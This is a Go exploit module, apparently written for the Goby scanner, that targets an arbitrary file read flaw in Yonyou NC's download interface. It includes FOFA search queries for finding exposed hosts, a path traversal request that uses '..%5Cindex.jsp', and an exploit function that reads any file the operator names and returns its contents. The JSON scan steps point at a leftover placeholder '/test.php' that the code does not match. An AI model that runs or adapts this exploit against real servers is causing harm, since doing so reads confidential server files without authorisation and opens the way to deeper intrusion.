package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC download File Read Vulnerability",
    "Description": "<p>Yonyou NC is a world-leading provider of software, cloud services and financial services for enterprises and public organizations. It offers products and services such as marketing, manufacturing, finance and human resources to help customers achieve their development goals and thereby promote business and social progress.</p><p>Its download interface has an arbitrary file reading vulnerability, allowing unauthorized attackers to read the contents of any file or directory on the server, which will cause harm to the system.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-12",
    "PostTime": "2024-08-15",
    "Author": "hhh3156",
    "FofaQuery": "title=\"Yonyou UAP\" || title=\"Yonyou NC\"&&body=\"Client/Uclient/UClient.exe\"",
    "GobyQuery": "title=\"Yonyou UAP\" || title=\"Yonyou NC\"&&body=\"Client/Uclient/UClient.exe\"",
    "Level": "1",
    "Impact": "<p>Its download interface has an arbitrary file reading vulnerability, allowing unauthorized attackers to read the contents of any file or directory on the server, which will cause harm to the system.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "index.jsp,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "用友NC download 文件读取漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。<br></p><p>其download接口存在任意文件读取漏洞，允许未经授权的攻击者读取服务器上任意文件或目录内容，会对系统造成危害。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>。</p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其download接口存在任意文件读取漏洞，允许未经授权的攻击者读取服务器上任意文件或目录内容，会对系统造成危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Yonyou NC download File Read Vulnerability",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>Yonyou NC is a world-leading provider of software, cloud services and financial services for enterprises and public organizations. It offers products and services such as marketing, manufacturing, finance and human resources to help customers achieve their development goals and thereby promote business and social progress.</p><p>Its download interface has an arbitrary file reading vulnerability, allowing unauthorized attackers to read the contents of any file or directory on the server, which will cause harm to the system.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its download interface has an arbitrary file reading vulnerability, allowing unauthorized attackers to read the contents of any file or directory on the server, which will cause harm to the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9932"
}`

	postOrGet_oJANbLAihuwANJINVIa88b25alp := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path := "/portal/pt/xml/file/download?pageId=login&filename=" + fileUrl
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/portal/pt/xml/file/download?pageId=login&filename=../index.jsp"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"..%5Cindex.jsp": "request.getSession(true)"}
			// 函数继承
			uploadFileFunc := postOrGet_oJANbLAihuwANJINVIa88b25alp

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"index.jsp": {"..%5Cindex.jsp", "request.getSession(true)"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_oJANbLAihuwANJINVIa88b25alp

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || resp == "" || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
